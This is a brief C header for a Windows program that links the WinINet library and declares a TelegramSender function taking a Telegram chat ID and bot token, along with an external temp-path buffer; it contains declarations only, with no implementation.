#ifndef TELEGRAM_H
#define TELEGRAM_H

#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#include "Config.h"

#pragma comment(lib, "wininet.lib")
#pragma warning(disable:4996)

extern char tempPath[];

void TelegramSender(const char* tgChatId, const char* tgBotToken);

#endif
